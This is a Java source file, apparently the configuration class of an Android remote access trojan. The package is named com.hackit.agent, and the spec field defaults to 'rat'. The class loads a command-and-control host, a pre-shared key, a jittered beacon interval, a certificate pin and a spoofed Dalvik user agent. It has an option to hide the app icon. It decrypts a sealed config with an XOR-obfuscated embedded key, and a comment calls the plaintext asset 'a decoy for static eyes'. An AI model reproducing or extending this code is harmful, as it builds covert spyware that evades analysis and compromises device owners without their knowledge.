package com.hackit.agent;

import android.content.Context;
import android.content.SharedPreferences;
import android.content.res.AssetManager;
import android.util.Base64;

import org.json.JSONArray;
import org.json.JSONObject;
import java.util.List;

import java.io.ByteArrayOutputStream;
import java.io.InputStream;

/** Build-time config (assets/agent.json) with a prefs overlay for runtime tweaks. */
final class Config {
    private static final String PREFS = "svc";
    private static final String KEY = "bootstrap";

    final String host;
    final byte[] psk;
    final String label;
    final long intervalMs;
    final double jitter;
    final String pin;
    final String userAgent;
    final int nativePort;
    final String spec;
    final List<String> modules;
    boolean hideIcon;
    long sleepOverrideMs;

    private Config(JSONObject json) throws Exception {
        host = json.getString("host").replaceAll("/+$", "");
        byte[] raw = Base64.decode(json.getString("psk"), Base64.DEFAULT);
        if (raw.length != 32) {
            throw new IllegalStateException("psk length " + raw.length);
        }
        psk = raw;
        label = json.optString("label", "android");
        intervalMs = Math.max(15000L, json.optLong("interval", 60000L));
        jitter = Math.min(0.6, Math.max(0.0, json.optDouble("jitter", 0.3)));
        pin = json.optString("pin", "").replace(":", "").toLowerCase();
        userAgent = json.optString("user_agent", "Dalvik/2.1.0 (Linux; U; Android)");
        nativePort = json.optInt("native_port", 0);
        hideIcon = json.optBoolean("hide_icon", false);
        spec = json.optString("spec", "rat");
        JSONArray list = json.optJSONArray("modules");
        List<String> names = new java.util.ArrayList<String>();
        if (list != null) {
            for (int i = 0; i < list.length(); i++) {
                names.add(list.optString(i, ""));
            }
        } else {
            names.add("info");
        }
        modules = names;
    }

    private static volatile Config cached;

    static Config get(Context ctx) {
        Config local = cached;
        if (local != null) {
            return local;
        }
        synchronized (Config.class) {
            if (cached == null) {
                cached = load(ctx.getApplicationContext());
            }
            return cached;
        }
    }

    private static byte[] readBytes(InputStream in) throws Exception {
        ByteArrayOutputStream out = new ByteArrayOutputStream(1024);
        byte[] buf = new byte[4096];
        int read;
        while ((read = in.read(buf)) > 0) {
            out.write(buf, 0, read);
        }
        in.close();
        return out.toByteArray();
    }

    private static String readAll(InputStream in) throws Exception {
        ByteArrayOutputStream out = new ByteArrayOutputStream(1024);
        byte[] buf = new byte[4096];
        int read;
        while ((read = in.read(buf)) > 0) {
            out.write(buf, 0, read);
        }
        in.close();
        return out.toString("UTF-8");
    }

    private static byte[] unseal(byte[] sealed, byte[] ignored) throws Exception {
        if (sealed.length < 13) {
            throw new IllegalStateException("sealed config truncated");
        }
        byte[] nonce = new byte[12];
        System.arraycopy(sealed, 0, nonce, 0, 12);
        byte[] cipher = new byte[sealed.length - 12];
        System.arraycopy(sealed, 12, cipher, 0, cipher.length);

        byte[] raw = new byte[ConfigKey.K.length];
        for (int i = 0; i < raw.length; i++) {
            raw[i] = (byte) (ConfigKey.K[i] ^ 0x5A);
        }
        java.security.MessageDigest digest = java.security.MessageDigest.getInstance("SHA-256");
        digest.update(raw);
        digest.update("config".getBytes("US-ASCII"));
        byte[] key = digest.digest();
        javax.crypto.Cipher aes = javax.crypto.Cipher.getInstance("AES/GCM/NoPadding");
        aes.init(javax.crypto.Cipher.DECRYPT_MODE, new javax.crypto.spec.SecretKeySpec(key, "AES"),
                new javax.crypto.spec.GCMParameterSpec(128, nonce));
        return aes.doFinal(cipher);
    }

    private static Config load(Context ctx) {
        try {
            SharedPreferences prefs = ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE);
            // Sealed config wins; the plaintext asset is a decoy for static eyes.
            AssetManager assets = ctx.getAssets();
            JSONObject json;
            InputStream sealed = null;
            try {
                sealed = assets.open("agent.bin");
            } catch (Throwable ignored) {
            }
            if (sealed != null) {
                json = new JSONObject(new String(unseal(readBytes(sealed), new byte[0]), "UTF-8"));
            } else {
                InputStream in = assets.open("agent.json");
                json = new JSONObject(readAll(in));
            }
            prefs.edit().putString(KEY, json.toString()).apply();
            Config config = new Config(json);
            config.sleepOverrideMs = prefs.getLong("sleep", 0L);
            return config;
        } catch (Exception exc) {
            throw new IllegalStateException("agent config unusable: " + exc, exc);
        }
    }

    void saveSleep(Context ctx, long ms) {
        sleepOverrideMs = ms;
        ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE).edit().putLong("sleep", ms).apply();
    }

    void saveHideIcon(Context ctx, boolean hide) {
        hideIcon = hide;
    }

    /** Current wait between polls: server override, else base, plus signed jitter. */
    long nextDelayMs() {
        long base = sleepOverrideMs > 0 ? Math.max(5000L, sleepOverrideMs) : intervalMs;
        double spread = 1.0 + (Math.random() * 2.0 - 1.0) * jitter;
        return Math.max(4000L, (long) (base * spread));
    }

    String url(String path) {
        return host + path;
    }
}
